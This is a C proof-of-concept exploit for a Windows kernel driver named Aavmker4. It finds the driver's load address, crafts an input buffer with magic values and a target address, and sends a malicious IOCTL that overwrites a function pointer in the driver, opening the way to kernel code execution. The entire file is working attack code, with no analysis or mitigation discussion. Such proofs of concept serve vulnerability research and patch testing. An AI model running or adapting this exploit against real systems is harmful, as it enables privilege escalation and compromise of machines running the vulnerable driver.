#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <psapi.h>
 
#define IOCTL				0xB2D60030  // vulnerable IOCTL
#define INPUTBUFFER_SIZE	0x878       // input data length
 
__inline void
memset32 (void* dest, unsigned int fill, unsigned int count)
{
	if (count > 0) {
		_asm {
			mov   eax, fill   // pattern
			mov   ecx, count  // count
			mov   edi, dest   // dest
			rep   stosd;
		}
	}
}

unsigned int
GetDriverLoadAddress (char *drivername)
{
	LPVOID			drivers[1024];
	DWORD			cbNeeded	= 0;
	int				cDrivers	= 0;
	int				i			= 0;
	const char *	ptr			= NULL;
	unsigned int	addr		= 0;    
  
	if (EnumDeviceDrivers (drivers, sizeof (drivers), &cbNeeded) && 
							cbNeeded < sizeof (drivers)) {
		char szDriver[1024];

		cDrivers = cbNeeded / sizeof (drivers[0]);

		for (i = 0; i < cDrivers; i++) {
			if (GetDeviceDriverBaseName (drivers[i], szDriver, 
										sizeof (szDriver) / sizeof (szDriver[0]))) {
				if (!strncmp (szDriver, drivername, 8)) {
					printf ("%s (%08x)\n", szDriver, drivers[i]);
					return (unsigned int)(drivers[i]);
				}
			}
		}
	}
  
	fprintf (stderr, "ERROR: cannot get address of driver %s\n", drivername);
 
	return 0;
 }
 
int
main (void)
{
	HANDLE			hDevice;
	char *			InputBuffer			= NULL;
	BOOL			retval				= TRUE;
	unsigned int	driveraddr			= 0;
	unsigned int	pattern1			= 0xD0DEAD07;
	unsigned int	pattern2			= 0x10BAD0BA; 
	unsigned int	addr_to_overwrite = 0;	// address to overwrite  
	char			data[2048];
 
	// get the base address of the driver
	if (!(driveraddr = GetDriverLoadAddress ("Aavmker4"))) {
		return 1;
	}
  
	// address of the function pointer at .data:00012460 that gets overwritten
	addr_to_overwrite = driveraddr + 0x2460;
   
	// allocate InputBuffer
	InputBuffer = (char *)VirtualAlloc ((LPVOID)0,
					INPUTBUFFER_SIZE,
					MEM_COMMIT | MEM_RESERVE,
					PAGE_EXECUTE_READWRITE);                
                    
	/////////////////////////////////////////////////////////////////////////////
	// InputBuffer data:
	//
	// .text:00010DC9  mov esi, [ebx+0Ch]  ; ESI == InputBuffer
  
	// fill InputBuffer with A's
	memset (InputBuffer, 0x41, INPUTBUFFER_SIZE);
  
	// .text:00010DE6  mov eax, [esi+870h] ; EAX == pointer to "data"
	memset32 (InputBuffer + 0x870, (unsigned int)&data, 1);
  
	/////////////////////////////////////////////////////////////////////////////
	// data:
	//
  
	// As the "data" buffer is used as a parameter for a "KeSetEvent" windows kernel
	// function it needs to contain some valid pointers (.text:00010E2C call ds:KeSetEvent)
	memset32 (data, (unsigned int)&data, sizeof (data) / sizeof (unsigned int));
  
	// .text:00010DEF  cmp dword ptr [eax], 0D0DEAD07h ; EAX == pointer to "data"
	memset32 (data, pattern1, 1);
  
	// .text:00010DF7  cmp dword ptr [eax+4], 10BAD0BAh ; EAX == pointer to "data"
	memset32 (data + 4, pattern2, 1);
  
	// .text:00010E18 mov edi, [eax+18h] ; EAX == pointer to "data"
	memset32 (data + 0x18, addr_to_overwrite, 1);
  
	/////////////////////////////////////////////////////////////////////////////
	// open device
	hDevice = CreateFile (TEXT("\\\\.\\AavmKer4"),
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				0,
				NULL);

	if (hDevice != INVALID_HANDLE_VALUE) {
		DWORD retlen = 0;

		// send evil IOCTL request
		retval = DeviceIoControl (hDevice,
					IOCTL,
					(LPVOID)InputBuffer,
					INPUTBUFFER_SIZE,
					(LPVOID)NULL,
					0,
					&retlen,
					NULL);
                  
		if (!retval) {
			fprintf (stderr, "[-] Error: DeviceIoControl failed\n");
		}
    
	} else {
		fprintf (stderr, "[-] Error: Unable to open device.\n");
	}
  
	return (0);
}